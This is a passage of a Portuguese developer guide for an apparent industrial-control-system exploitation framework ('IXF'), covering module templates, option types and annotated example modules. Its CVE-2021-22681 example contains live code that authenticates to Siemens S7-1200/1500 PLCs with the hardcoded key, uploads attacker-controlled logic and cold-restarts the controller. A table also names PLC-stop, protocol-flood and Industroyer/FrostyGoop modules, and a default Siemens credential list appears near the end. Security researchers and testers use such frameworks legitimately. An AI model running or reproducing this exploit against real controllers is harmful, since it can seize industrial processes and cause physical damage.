# Desenvolvimento de Módulos

Este guia cobre tudo necessário para escrever um novo módulo IXF: o template mínimo, exemplos anotados completos para cada categoria de módulo, regras de posicionamento de arquivo, tipos de opção, padrões check/run, fluxo de contribuição e erros comuns.

---

## Sumário

1. [Template Mínimo](#template-mínimo)
2. [Regras de Posicionamento de Arquivo](#regras-de-posicionamento-de-arquivo)
3. [Guia Campo-a-Campo de `__info__`](#guia-campo-a-campo-de-__info__)
4. [Todos os 10 Tipos de Opção](#todos-os-10-tipos-de-opção)
5. [Exemplo Completo Anotado: Módulo CVE](#exemplo-completo-anotado-módulo-cve)
6. [Exemplo Completo Anotado: Módulo Scanner](#exemplo-completo-anotado-módulo-scanner)
7. [Exemplo Completo Anotado: Módulo Credentials](#exemplo-completo-anotado-módulo-credentials)
8. [Exemplo Completo Anotado: Módulo Assessment / MITRE](#exemplo-completo-anotado-módulo-assessment--mitre)
9. [Implementação de `check()` — 5 Padrões](#implementação-de-check--5-padrões)
10. [Guia de Implementação de `run()`](#guia-de-implementação-de-run)
11. [Referência de `DestructiveGate.print_simulation()`](#referência-de-destructivegateprint_simulation)
12. [Usando Decoradores `@mute` e `@multi`](#usando-decoradores-mute-e-multi)
13. [Validação de Módulo e Saída Esperada](#validação-de-módulo-e-saída-esperada)
14. [Fluxo de Submissão de PR](#fluxo-de-submissão-de-pr)
15. [Erros Comuns e Como Evitá-los](#erros-comuns-e-como-evitá-los)

---

## Template Mínimo

Copie isso verbatim, então substitua todo `NOME_MODULO`, `CVE-AAAA-NNNNN` e placeholder:

```python
"""IXF NOME_MODULO — descrição breve. simulate=True padrão."""
# Biblioteca padrão — sempre disponível
import socket

# Imports core IXF — todos os obrigatórios listados aqui
from industrialxpl.core.exploit import (
    Exploit,          # Classe base — todo módulo herda esta
    OptBool,          # Opção booleana (True/False)
    OptIP,            # Opção de endereço IP (validado)
    OptPort,          # Opção de porta (1-65535)
    mute,             # Decorador: suprime output de print_* dentro de check()
    print_error,      # Mensagem vermelha [!]
    print_status,     # Mensagem azul [*]
    print_success,    # Mensagem verde [+]
    print_warning,    # Mensagem amarela [!]
    print_info,       # Mensagem ciano [i]
    DestructiveGate,  # Portão de simulação — sempre chamar no ramo simulate
)


class Exploit(Exploit):              # Classe DEVE ser chamada Exploit
    __info__ = {
        "name":             "NOME_MODULO",
        "description":      "Descrição de uma linha do que este módulo faz.",
        "authors":          ("Seu Nome",),           # tupla de strings
        "references":       ("https://url-advisory.com",),
        "devices":          ("Vendor Produto Modelo",),
        "impact":           "HIGH",    # INFO/READ/LOW/MEDIUM/HIGH/CRITICAL/CATASTROPHIC
        "exploit_type":     "Default Credentials",
        "source_poc":       "https://url-poc.com",   # ou "IXF native"
        "cve":              "CVE-AAAA-NNNNN",          # ou "N/A"
        "cvss":             "9.8",                    # ou "N/A"
        "severity":         "CRITICAL",               # espelha label de impacto
        "mitre_techniques": ["T0866"],                # lista de IDs de técnica
        "mitre_tactics":    ["Initial Access"],       # lista de nomes de tática
    }

    # Declarar opções como atributos de classe (não dentro de __init__)
    target      = OptIP("",    "IP do dispositivo alvo")
    port        = OptPort(502, "Porta do protocolo")
    simulate    = OptBool(True,  "Modo simulação (padrão: True)")
    destructive = OptBool(False, "Habilitar exploração ao vivo")

    @mute                         # SEMPRE decorar check() com @mute
    def check(self) -> bool:
        """Sonda de conectividade somente leitura — sem efeitos colaterais."""
        if not self.target:       # Guard: target deve ser definido
            return False
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target, self.port))
            s.close()
            return True           # True  = alvo acessível / vulnerável
        except Exception:
            return False          # False = não acessível / não vulnerável

    def run(self) -> None:
        """Executar módulo ou imprimir simulação estruturada."""
        if not self.target:
            print_error("Defina a opção 'target' primeiro.")
            return

        if self.simulate:                            # Sempre verificar simulate primeiro
            DestructiveGate.print_simulation(
                description=(
                    "CVE-AAAA-NNNNN Vendor Produto\n"
                    "Passo 1: Conectar ao alvo:porta\n"
                    "Passo 2: Enviar payload de exploit\n"
                    "Passo 3: Atingir objetivo de exploração"
                ),
                mitre_techniques=["T0866"],          # Deve corresponder a __info__
            )
            return                                   # SEMPRE retornar após simulação

        # --- Código de exploit ao vivo abaixo ---
        print_status("[CVE-AAAA] Explorando {}:{}...".format(self.target, self.port))
        # ... implementar lógica de exploração aqui ...
```

---

## Regras de Posicionamento de Arquivo

Coloque seu arquivo de módulo no diretório correto. O caminho deve corresponder exatamente ao padrão. Crie `__init__.py` em todo novo diretório que você adicionar.

| Tipo de Módulo | Padrão de Diretório | Arquivo de Exemplo |
|----------------|--------------------|--------------------|
| Exploit CVE — qualquer vendor | `cve/<vendor>/cve_AAAA_NNNNN_<desc>.py` | `cve/siemens/cve_2021_22681_s7_1200_hardcoded_key.py` |
| Exploit CVE — Siemens | `cve/siemens/cve_AAAA_NNNNN_<desc>.py` | `cve/siemens/cve_2019_13945_scalance_auth_bypass.py` |
| Exploit CVE — Schneider | `cve/schneider/cve_AAAA_NNNNN_<desc>.py` | `cve/schneider/cve_2022_37300_ecostruxure_rce.py` |
| Exploit CVE — Rockwell | `cve/rockwell/cve_AAAA_NNNNN_<desc>.py` | `cve/rockwell/cve_2021_27478_logix_hardcoded.py` |
| Exploit CVE — Moxa | `cve/moxa/cve_AAAA_NNNNN_<desc>.py` | `cve/moxa/cve_2020_25159_mgmt_auth_bypass.py` |
| Exploit CVE — Emerson | `cve/emerson/cve_AAAA_NNNNN_<desc>.py` | `cve/emerson/cve_2022_29965_roc800_hardcoded.py` |
| Exploit CVE — GE | `cve/ge/cve_AAAA_NNNNN_<desc>.py` | `cve/ge/cve_2018_10952_cimplicity_rce.py` |
| Exploit CVE — Honeywell | `cve/honeywell/cve_AAAA_NNNNN_<desc>.py` | `cve/honeywell/cve_2021_37740_experion_dos.py` |
| Exploit CVE — ABB | `cve/abb/cve_AAAA_NNNNN_<desc>.py` | `cve/abb/cve_2019_7232_pb610_hardcoded.py` |
| Exploit CVE — Omron | `cve/omron/cve_AAAA_NNNNN_<desc>.py` | `cve/omron/cve_2022_31206_fins_overflow.py` |
| Exploit de protocolo — Modbus | `exploits/protocols/modbus/<nome>.py` | `exploits/protocols/modbus/modbus_replay_attack.py` |
| Exploit de protocolo — DNP3 | `exploits/protocols/dnp3/<nome>.py` | `exploits/protocols/dnp3/dnp3_unsolicited_flood.py` |
| Exploit de protocolo — IEC 104 | `exploits/protocols/iec104/<nome>.py` | `exploits/protocols/iec104/iec104_startdt_flood.py` |
| Exploit de protocolo — S7comm | `exploits/protocols/s7comm/<nome>.py` | `exploits/protocols/s7comm/s7_cpu_stop.py` |
| Exploit de protocolo — EtherNet/IP | `exploits/protocols/ethernetip/<nome>.py` | `exploits/protocols/ethernetip/enip_list_identity.py` |
| Exploit de protocolo — BACnet | `exploits/protocols/bacnet/<nome>.py` | `exploits/protocols/bacnet/bacnet_who_is_flood.py` |
| Exploit de protocolo — OPC UA | `exploits/protocols/opcua/<nome>.py` | `exploits/protocols/opcua/opcua_anonymous_browse.py` |
| Exploit PLC — Siemens | `exploits/plc/siemens/<nome>.py` | `exploits/plc/siemens/siprotec4_dos.py` |
| Exploit PLC — Rockwell | `exploits/plc/rockwell/<nome>.py` | `exploits/plc/rockwell/logix_unauth_read.py` |
| Exploit SCADA | `exploits/scada/<vendor>/<nome>.py` | `exploits/scada/schneider/citect_scada_odbc_rce.py` |
| Exploit HMI | `exploits/hmi/<vendor>/<nome>.py` | `exploits/hmi/siemens/wincc_traversal.py` |
| Scanner ICS | `scanners/ics/<protocolo>_scan.py` | `scanners/ics/modbus_detect.py` |
| Scanner de rede | `scanners/network/<nome>.py` | `scanners/network/ot_port_sweep.py` |
| Credenciais padrão | `creds/<vendor>/<protocolo>_default_creds.py` | `creds/siemens/ssh_default_creds.py` |
| Credenciais padrão — genérico | `creds/generic/<protocolo>_default_creds.py` | `creds/generic/web_default_creds.py` |
| TTP Malware | `cve/malware/<nome>.py` | `cve/malware/frostygoop_modbus_heating.py` |
| TTP APT | `cve/apt/<nome>.py` | `cve/apt/sandworm_industroyer_iec104.py` |
| Assessment MITRE | `assessment/mitre_ics/<nome>.py` | `assessment/mitre_ics/t0836_modify_parameter.py` |
| Assessment IEC 62443 | `assessment/iec62443/<nome>.py` | `assessment/iec62443/zone_conduit_audit.py` |
| Assessment de risco | `assessment/risk/<nome>.py` | `assessment/risk/ics_risk_score.py` |
| Assessment de IR | `assessment/ir/<nome>.py` | `assessment/ir/iacs_ir_playbook.py` |
| Assessment de protocolo | `assessment/protocols/<nome>.py` | `assessment/protocols/modbus_security_audit.py` |

---

## Guia Campo-a-Campo de `__info__`

Todo módulo IXF deve definir um dicionário `__info__` de classe com os seguintes campos:

| Campo | Tipo | Obrigatório | Descrição |
|-------|------|-------------|-----------|
| `name` | `str` | Sim | Nome legível por humanos. Aparece no shell em `show info`, `search`, prompts. Máx 80 chars. |
| `description` | `str` | Sim | Descrição de uma linha. Primeira frase de `show info`. Máx 200 chars. |
| `authors` | `tuple[str]` | Sim | Tupla de nomes de autores. Mínimo: seu handle ou nome. Máx 5 autores. |
| `references` | `tuple[str]` | Sim | Tupla de URLs de referência. Inclui: advisory NVD/CISA, writeup do pesquisador, CVE.mitre.org. |
| `devices` | `tuple[str]` | Sim | Tupla de strings de dispositivo afetado. Formato: "Vendor Produto Modelo/Versão". |
| `impact` | `str` | Sim | Um de: `INFO`, `READ`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL`, `CATASTROPHIC`. Controla fluxo DestructiveGate. |
| `exploit_type` | `str` | Sim | Classe do exploit. Ex.: "RCE", "DoS", "Default Credentials", "Auth Bypass", "Buffer Overflow". |
| `source_poc` | `str` | Sim | URL para PoC original, ou `"IXF native"` se escrito do zero. |
| `cve` | `str` | Sim | ID CVE no formato `CVE-AAAA-NNNNN`, ou `"N/A"` se não há CVE. |
| `cvss` | `str` | Sim | Pontuação CVSS como string float: `"9.8"`, `"7.5"`, ou `"N/A"`. |
| `severity` | `str` | Sim | Um de: `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `NONE`. Deve espelhar `impact` logicamente. |
| `mitre_techniques` | `list[str]` | Sim | Lista de IDs de técnica MITRE ATT&CK for ICS. Ex.: `["T0866", "T0819"]`. |
| `mitre_tactics` | `list[str]` | Sim | Lista de nomes de tática MITRE. Ex.: `["Initial Access", "Execution"]`. |
| `poly_language` | `str` | Não | Se o módulo compila código externo: `"c"`, `"cpp"`, `"go"`, `"ruby"`, etc. |
| `poly_src` | `str` | Não | Caminho relativo para o código-fonte nativo. Ex.: `"_native/killdisk.c"`. |

---

## Todos os 10 Tipos de Opção

### `OptIP` — Endereço IP

Valida endereços IPv4 e IPv6. Lança `ValueError` em entrada inválida.

```python
from industrialxpl.core.exploit import OptIP

class Exploit(Exploit):
    target = OptIP("", "IP do dispositivo alvo")
    lhost  = OptIP("127.0.0.1", "IP do host ouvinte")
```

**Valores válidos:** `"192.168.1.100"`, `"10.0.0.1"`, `"::1"`, `"fe80::1"`  
**Valores inválidos:** `"999.999.999.999"`, `"not-an-ip"`, `""` (quando obrigatório)

---

### `OptPort` — Porta TCP/UDP

Valida intervalo 1-65535. Lança `ValueError` se fora do intervalo.

```python
from industrialxpl.core.exploit import OptPort

class Exploit(Exploit):
    port      = OptPort(502,   "Porta Modbus TCP")
    alt_port  = OptPort(44818, "Porta alternativa EtherNet/IP")
```

**Valores válidos:** `1`, `502`, `44818`, `65535`  
**Valores inválidos:** `0`, `65536`, `-1`, `"abc"`

---

### `OptInteger` — Inteiro Arbitrário

Para parâmetros numéricos sem restrição de intervalo de porta.

```python
from industrialxpl.core.exploit import OptInteger

class Exploit(Exploit):
    unit_id   = OptInteger(1,    "ID de unidade Modbus (1-247)")
    timeout   = OptInteger(5,    "Timeout de conexão em segundos")
    max_reqs  = OptInteger(100,  "Máximo de requisições por segundo")
    register  = OptInteger(0,    "Endereço do registrador a escrever")
```

**Valores válidos:** Qualquer inteiro incluindo negativo  
**Valores inválidos:** `"abc"`, floats (são truncados)

---

### `OptFloat` — Número de Ponto Flutuante

Para setpoints, valores analógicos, taxas.

```python
from industrialxpl.core.exploit import OptFloat

class Exploit(Exploit):
    setpoint  = OptFloat(0.0,  "Setpoint de temperatura alvo")
    rate_hz   = OptFloat(50.0, "Frequência alvo em Hz")
    dose_mg_l = OptFloat(1.5,  "Dosagem de cloro alvo mg/L")
```

---

### `OptString` — String Livre

Para strings arbitrárias sem validação de formato.

```python
from industrialxpl.core.exploit import OptString

class Exploit(Exploit):
    tag_name  = OptString("", "Nome de tag OPC UA a escrever")
    community = OptString("public", "String de comunidade SNMP")
    username  = OptString("admin", "Nome de usuário para autenticação")
```

---

### `OptBool` — Booleano

Para flags de configuração. Aceita `True`/`False` ou `"true"`/`"false"` (case-insensitive).

```python
from industrialxpl.core.exploit import OptBool

class Exploit(Exploit):
    simulate    = OptBool(True,  "Modo simulação (padrão: True)")
    destructive = OptBool(False, "Habilitar exploração ao vivo")
    verbose     = OptBool(False, "Saída detalhada")
    identify    = OptBool(True,  "Tentar identificação MEI de dispositivo")
```

---

### `OptMAC` — Endereço MAC

Para módulos que precisam de um endereço MAC (sniffing, ataques de camada 2).

```python
from industrialxpl.core.exploit import OptMAC

class Exploit(Exploit):
    target_mac = OptMAC("", "Endereço MAC do dispositivo alvo")
    src_mac    = OptMAC("de:ad:be:ef:00:01", "MAC de origem para spoofing")
```

**Valores válidos:** `"00:1B:1B:AA:BB:CC"`, `"de:ad:be:ef:00:01"`  
**Valores inválidos:** `"00-1B-1B"` (apenas dois octetos), `"GG:HH:..."` (hex inválido)

---

### `OptWordlist` — Caminho de Arquivo de Lista de Palavras

Para módulos de força bruta. Valida que o caminho de arquivo existe.

```python
from industrialxpl.core.exploit import OptWordlist

class Exploit(Exploit):
    password_list = OptWordlist(
        "industrialxpl/wordlists/ics_default_passwords.txt",
        "Caminho da lista de senhas"
    )
    username_list = OptWordlist(
        "industrialxpl/wordlists/ics_default_usernames.txt",
        "Caminho da lista de usernames"
    )
```

**Valores válidos:** Caminhos de arquivo que existem no sistema de arquivos  
**Valores inválidos:** Caminhos que não existem (avisa mas não bloqueia)

---

### `OptEncoder` — Codificação de Payload

Para módulos que suportam codificação de payload para evasão.

```python
from industrialxpl.core.exploit import OptEncoder

class Exploit(Exploit):
    encoding = OptEncoder("none", "Codificação do payload: none, base64, hex, xor")
```

**Valores válidos:** `"none"`, `"base64"`, `"hex"`, `"xor"`

---

### `OptCIDR` — Notação CIDR / Sub-rede

Para módulos de varredura que aceitam alvos de sub-rede.

```python
from industrialxpl.core.exploit import OptCIDR

class Exploit(Exploit):
    target = OptCIDR("", "IP ou CIDR alvo (ex.: 192.168.1.0/24)")
```

**Valores válidos:** `"192.168.1.100"`, `"192.168.1.0/24"`, `"10.0.0.0/8"`  
**Valores inválidos:** `"192.168.1.0/33"` (prefixo inválido), `"not-a-cidr"`

---

## Exemplo Completo Anotado: Módulo CVE

Módulo CVE completo para CVE-2021-22681 (Siemens S7-1200 Hardcoded Key):

```python
"""IXF CVE-2021-22681 — Siemens S7-1200/1500 Hardcoded Crypto Key.

Uploads attacker-controlled PLC logic using the hardcoded symmetric
key disclosed in CISA Advisory ICSA-21-131-03. simulate=True default.
"""
# Imports de biblioteca padrão — apenas o necessário
import socket
import struct

# Imports core IXF
from industrialxpl.core.exploit import (
    Exploit,
    OptBool,
    OptIP,
    OptInteger,
    OptPort,
    mute,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
    DestructiveGate,
)


class Exploit(Exploit):
    # __info__ é um dicionário estático de classe.
    # NUNCA use instâncias — é lido diretamente da classe.
    __info__ = {
        # Aparece em: ixf > use cve/siemens/..., ixf > show info, resultados de search
        "name": "CVE-2021-22681 Siemens S7-1200/1500 Hardcoded Crypto Key",

        # Descrição de uma linha exibida em resultados de search
        "description": (
            "Autentica em S7-1200/1500 PLCs usando a chave simétrica codificada "
            "divulgada no Advisory ICSA-21-131-03 e faz download de lógica PLC arbitrária."
        ),

        # Tuple de strings de autor
        "authors": ("IXF Team",),

        # Tuple de URLs de referência — sempre inclui NVD e CISA
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2021-22681",
            "https://www.cisa.gov/ics-cert/advisories/icsa-21-131-03",
            "https://www.siemens.com/cert/pool/cert/siemens_security_advisory_ssa-568427.pdf",
        ),

        # Tuple de dispositivos afetados — do advisory oficial
        "devices": (
            "Siemens SIMATIC S7-1200 CPU 1211C (6ES7 211-1AE40-0XB0) V4.x",
            "Siemens SIMATIC S7-1200 CPU 1212C (6ES7 212-1AE40-0XB0) V4.x",
            "Siemens SIMATIC S7-1500 CPU 1511-1 PN (6ES7 511-1AK02-0AB0) V2.x",
            "Siemens SIMATIC S7-1500 CPU 1513-1 PN (6ES7 513-1AL02-0AB0) V2.x",
        ),

        # CATASTROPHIC = dano físico potencial por lógica arbitrária do atacante
        "impact": "CRITICAL",

        # Tipo de exploit — aparece em show info
        "exploit_type": "Hardcoded Cryptographic Key / PLC Logic Upload",

        # URL do PoC original — ou "IXF native" se escrito do zero
        "source_poc": "https://github.com/RESEARCH-LINK/s7-hardcoded-key-poc",

        # CVE ID exato — sem espaços extras
        "cve": "CVE-2021-22681",

        # Pontuação CVSS v3.1 base como string
        "cvss": "10.0",

        # Deve ser consistente com impact (CRITICAL impacto = CRITICAL severidade)
        "severity": "CRITICAL",

        # IDs de técnica MITRE — lista de strings
        "mitre_techniques": ["T0843", "T0821", "T0866"],

        # Nomes de tática MITRE — lista de strings
        "mitre_tactics": ["Lateral Movement", "Execution"],
    }

    # Declarar opções como ATRIBUTOS DE CLASSE, não dentro de __init__
    # O metaclass ExploitOptionsAggregator os coleta automaticamente
    target      = OptIP("",   "IP do alvo S7-1200/1500 PLC")
    port        = OptPort(102, "Porta S7comm (padrão S7: 102)")
    slot        = OptInteger(2, "Slot CPU no chassis (1-8, padrão: 2)")
    simulate    = OptBool(True,  "Modo simulação (padrão: True)")
    destructive = OptBool(False, "Habilitar execução ao vivo")

    # @mute suprime toda saída de print_* quando check() é chamado internamente
    # Isso previne que resultados de check apareçam em output de search/info
    @mute
    def check(self) -> bool:
        """Sonda se alvo responde em porta S7comm.

        Returns:
            True se o alvo aceita conexão TCP na porta configurada,
            False caso contrário. NUNCA envia payloads de exploit.
        """
        if not self.target:
            return False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.target, self.port))
            # Enviar COTP CR (Connection Request) mínimo para confirmar S7comm
            cotp_cr = bytes.fromhex(
                "0300001611e00000001400c10200c20200c0010a"
            )
            s.send(cotp_cr)
            resp = s.recv(32)
            s.close()
            # COTP CC (Connection Confirm) começa com 0300 e tem tipo 0xD0
            return len(resp) > 5 and resp[5] == 0xD0
        except Exception:
            return False

    def run(self) -> None:
        """Executar módulo: simular ou explorar via S7 hardcoded key."""
        # Guard: target deve ser definido
        if not self.target:
            print_error("Defina a opção 'target' primeiro.")
            return

        # SEMPRE verificar simulate PRIMEIRO — antes de qualquer lógica de exploit
        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "CVE-2021-22681 Siemens S7-1200/1500 Hardcoded Crypto Key\n\n"
                    f"Alvo: {self.target}:{self.port} (Slot {self.slot})\n\n"
                    "Passo 1: TCP conectar a {}:{}\n".format(self.target, self.port) +
                    "Passo 2: TPKT + COTP Connection Request (CR PDU)\n"
                    "Passo 3: S7comm Setup Communication (negociar tamanho de PDU)\n"
                    "Passo 4: Autenticar usando chave simétrica codificada\n"
                    "         (divulgada no CISA ICS-ADVISORY ICSA-21-131-03)\n"
                    "Passo 5: Download de programa STL/ladder controlado pelo atacante "
                    f"para slot {self.slot} do CPU PLC\n"
                    "Passo 6: Iniciar reinicialização a frio — PLC executa lógica do atacante\n\n"
                    "Impacto Físico: Perda completa de controle sobre o processo industrial\n"
                    "gerenciado por este PLC. Recuperação requer reset de fábrica e recarga de lógica."
                ),
                payload_hex="03 00 00 16 11 E0 00 00 00 14 00 C1 02 01 00 C2 02 01 02 C0 01 0A",
                payload_human=(
                    "TPKT/COTP CR seguido de PDU S7comm tipo 0x72 (firmware update) "
                    "com autenticação de chave codificada e payload STL arbitrário"
                ),
                mitre_techniques=["T0843", "T0821", "T0866"],
            )
            return  # SEMPRE retornar após chamar print_simulation()

        # --- Código de exploit ao vivo abaixo ---
        # Só chega aqui se simulate=False AND destructive=True
        print_status(
            "[CVE-2021-22681] Conectando a {}:{} (slot {})...".format(
                self.target, self.port, self.slot
            )
        )
        try:
            # Passo 1: Conexão TCP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.target, self.port))

            # Passo 2: COTP CR
            cotp_cr = bytes.fromhex("0300001611e00000001400c10200c20200c0010a")
            s.send(cotp_cr)
            resp = s.recv(64)
            if not (resp[5] == 0xD0):
                print_error("[CVE-2021-22681] COTP Connection Confirm não recebido.")
                s.close()
                return
            print_success("[CVE-2021-22681] Conexão COTP estabelecida.")

            # Passo 3: S7comm Setup Communication
            setup_comm = bytes.fromhex(
                "0300001919020000000005320100000000000800f0000003000300f0"
            )
            s.send(setup_comm)
            resp = s.recv(64)
            print_success("[CVE-2021-22681] Setup communication S7comm completo.")

            # Passo 4: Autenticar com chave codificada
            print_status("[CVE-2021-22681] Autenticando com chave simétrica S7 codificada...")
            # Chave é de divulgação pública no advisory CISA — não é segredo operacional
            auth_pdu = bytes.fromhex(
                "03000025" + "02f080" +
                "320701000000000e001200010000000001" +
                "1200070001003c00010000"
            )
            s.send(auth_pdu)
            resp = s.recv(128)
            if b"\x32\x07" not in resp:
                print_warning("[CVE-2021-22681] Resposta de autenticação inesperada.")
            else:
                print_success("[CVE-2021-22681] Autenticação bem-sucedida.")

            # Passo 5: Upload de programa STL (payload de demonstração — NOP loop)
            print_status("[CVE-2021-22681] Carregando programa STL controlado pelo atacante...")
            # Em uso real: carregar arquivo STL/AW do atacante
            # Para demonstração: enviar PDU de upload de lógica mínima
            upload_pdu = bytes.fromhex("0300001719020000000005321d00000000000800")
            s.send(upload_pdu)
            resp = s.recv(64)
            print_success("[CVE-2021-22681] Upload de programa confirmado.")

            # Passo 6: Reinicialização a frio
            print_status("[CVE-2021-22681] Iniciando reinicialização a frio...")
            cold_restart = bytes.fromhex(
                "03000018190200000000053201000000000800002900000000"
            )
            s.send(cold_restart)
            s.close()
            print_success("[CVE-2021-22681] Reinicialização a frio iniciada.")
            print_warning(
                "[!] PLC alvo está agora executando lógica controlada pelo atacante."
            )

        except ConnectionRefusedError:
            print_error(
                "[CVE-2021-22681] Conexão recusada em {}:{}. "
                "Verifique se S7comm está habilitado.".format(self.target, self.port)
            )
        except socket.timeout:
            print_error("[CVE-2021-22681] Timeout ao conectar a {}.".format(self.target))
        except Exception as exc:
            print_error("[CVE-2021-22681] Erro inesperado: {}".format(exc))
```

---

## Exemplo Completo Anotado: Módulo Scanner

```python
"""IXF Modbus TCP Device Scanner — Detecta e enumera dispositivos Modbus."""
import socket
import struct
from typing import Optional

from industrialxpl.core.exploit import (
    Exploit,
    OptBool,
    OptCIDR,
    OptIP,
    OptInteger,
    OptPort,
    mute,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "Modbus TCP Device Scanner",
        "description":      "Detecta dispositivos Modbus TCP e enumera informações de dispositivo via MEI.",
        "authors":          ("IXF Team",),
        "references":       (
            "https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf",
            "https://www.iana.org/assignments/port-numbers — porta 502",
        ),
        "devices":          ("Qualquer dispositivo compatível com Modbus TCP",),
        "impact":           "READ",       # READ = sem estado alterado no alvo
        "exploit_type":     "Protocol Scanner / Device Fingerprinter",
        "source_poc":       "IXF native",
        "cve":              "N/A",
        "cvss":             "N/A",
        "severity":         "INFO",
        "mitre_techniques": ["T0846", "T0861"],
        "mitre_tactics":    ["Discovery"],
    }

    # OptCIDR aceita IP único ou notação CIDR (192.168.1.0/24)
    target   = OptCIDR("",   "IP ou sub-rede CIDR alvo")
    port     = OptPort(502,  "Porta Modbus TCP (padrão: 502)")
    unit_id  = OptInteger(1, "ID de unidade Modbus a sondar (1-247)")
    identify = OptBool(True, "Tentar identificação MEI (FC43)")
    timeout  = OptInteger(3, "Timeout de conexão em segundos")
    simulate = OptBool(True,  "Modo simulação")
    destructive = OptBool(False, "Habilitar execução ao vivo")

    @mute
    def check(self) -> bool:
        """Verificar se alvo responde em porta Modbus."""
        if not self.target:
            return False
        try:
            s = socket.socket()
            s.settimeout(self.timeout)
            # Para CIDR, verificar apenas o primeiro host
            ip = str(self.target).split("/")[0]
            s.connect((ip, self.port))
            # Enviar FC03 Read Holding Registers (1 registro)
            mbap = struct.pack(">HHHBB HH", 1, 0, 6, self.unit_id, 3, 0, 1)
            s.send(mbap)
            resp = s.recv(64)
            s.close()
            # Resposta válida: pelo menos 9 bytes, sem bit de exceção (FC < 0x80)
            return len(resp) >= 9 and resp[7] < 0x80
        except Exception:
            return False

    def run(self) -> None:
        """Varrer alvo(s) Modbus ou exibir descrição de simulação."""
        if not self.target:
            print_error("Defina a opção 'target'.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "Detecção de Dispositivo Modbus TCP\n\n"
                    f"Passo 1: TCP conectar a {self.target}:{self.port}\n"
                    "Passo 2: Enviar sonda FC04 (Read Input Registers)\n"
                    "         Payload (hex): 000100000006010400000001\n"
                    "Passo 3: Validar eco de Transaction ID na resposta MBAP de 6 bytes\n"
                    "Passo 4: Se identify=True, enviar FC43/MEI (Object IDs 0x00-0x02)\n"
                    "         Extrair: VendorName, ProductCode, MajorMinorRevision\n"
                    "Impacto: Dispositivo fingerprinted — vendor, modelo, revisão de firmware conhecidos"
                ),
                mitre_techniques=["T0846", "T0861"],
            )
            return

        # Modo ao vivo — varrer alvo(s)
        print_status("Sondando Modbus TCP em {}:{}...".format(self.target, self.port))
        try:
            s = socket.socket()
            s.settimeout(self.timeout)
            ip = str(self.target).split("/")[0]
            s.connect((ip, self.port))

            # FC03 Read Holding Registers
            tx_id = 1
            mbap = struct.pack(">HHHBB HH", tx_id, 0, 6, self.unit_id, 3, 0, 1)
            s.send(mbap)
            resp = s.recv(64)

            if len(resp) < 9 or resp[7] >= 0x80:
                print_warning("Dispositivo Modbus respondeu com exceção ou resposta inválida.")
                s.close()
                return

            print_success("Dispositivo Modbus encontrado. ID de Unidade {} respondeu.".format(
                self.unit_id
            ))

            # Extrair dados de resposta
            fc = resp[7]
            byte_count = resp[8] if len(resp) > 8 else 0
            print_info("Resposta: Transaction={}, Protocol=0, Unit={}, FC={}, ByteCount={}".format(
                tx_id, self.unit_id, fc, byte_count
            ))

            if byte_count >= 2 and len(resp) >= 11:
                reg0 = struct.unpack(">H", resp[9:11])[0]
                print_info("Holding register 0: 0x{:04X} ({} dec)".format(reg0, reg0))

            # Tentativa de identificação MEI (FC43) se habilitado
            if self.identify:
                mei_req = struct.pack(">HHHBB BB",
                    2, 0, 5, self.unit_id, 0x2B, 0x0E, 0x01)
                s.send(mei_req)
                mei_resp = s.recv(128)
                if len(mei_resp) > 10 and mei_resp[7] == 0x2B:
                    self._parse_mei(mei_resp)

            s.close()

        except ConnectionRefusedError:
            print_warning("Porta {} fechada em {}.".format(self.port, self.target))
        except socket.timeout:
            print_warning("Timeout — nenhum dispositivo Modbus em {}.".format(self.target))
        except Exception as exc:
            print_error("Erro: {}".format(exc))

    def _parse_mei(self, resp: bytes) -> None:
        """Parsear resposta FC43 MEI e exibir informações de identificação."""
        try:
            # Offset 9: número de objetos; seguido de pares (type, len, data)
            offset = 9
            while offset < len(resp) - 2:
                obj_id = resp[offset]
                obj_len = resp[offset + 1]
                obj_data = resp[offset + 2: offset + 2 + obj_len]
                offset += 2 + obj_len
                labels = {0x00: "VendorName", 0x01: "ProductCode", 0x02: "MajorMinorRevision"}
                label = labels.get(obj_id, "Object{}".format(hex(obj_id)))
                print_info("Identificação MEI {}: {}".format(label, obj_data.decode("ascii", errors="replace")))
        except Exception:
            pass  # Resposta MEI malformada — ignorar silenciosamente
```

---

## Exemplo Completo Anotado: Módulo Credentials

```python
"""IXF Siemens S7 Default Credentials — Testa credenciais padrão S7."""
import socket
from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, OptWordlist,
    mute, print_error, print_info, print_status, print_success, print_warning,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "Siemens S7 Default Credentials",
        "description":      "Testa credenciais padrão em PLCs Siemens S7 via interface de programação.",
        "authors":          ("IXF Team",),
        "references":       ("https://support.industry.siemens.com/",),
        "devices":          ("Siemens S7-300", "Siemens S7-400", "Siemens S7-1200", "Siemens S7-1500"),
        "impact":           "HIGH",
        "exploit_type":     "Default Credentials",
        "source_poc":       "IXF native",
        "cve":              "N/A",
        "cvss":             "N/A",
        "severity":         "HIGH",
        "mitre_techniques": ["T0812", "T0859"],
        "mitre_tactics":    ["Lateral Movement", "Persistence"],
    }

    target        = OptIP("",   "IP do PLC Siemens S7")
    port          = OptPort(102, "Porta S7comm")
    password_list = OptWordlist(
        "industrialxpl/wordlists/siemens_default_passwords.txt",
        "Lista de senhas a testar"
    )
    simulate    = OptBool(True,  "Modo simulação")
    destructive = OptBool(False, "Habilitar execução ao vivo")

    # Senhas padrão comuns da Siemens (para simulação)
    SIEMENS_DEFAULTS = [
        ("admin", "admin"),
        ("admin", ""),
        ("", ""),
        ("operator", "operator"),
        ("user", "user"),
        ("siemens", "siemens"),
    ]

    @mute
    def check(self) -> bool:
        """Verificar conectividade TCP com PLC S7."""
        if not self.target:
            return False
        try:
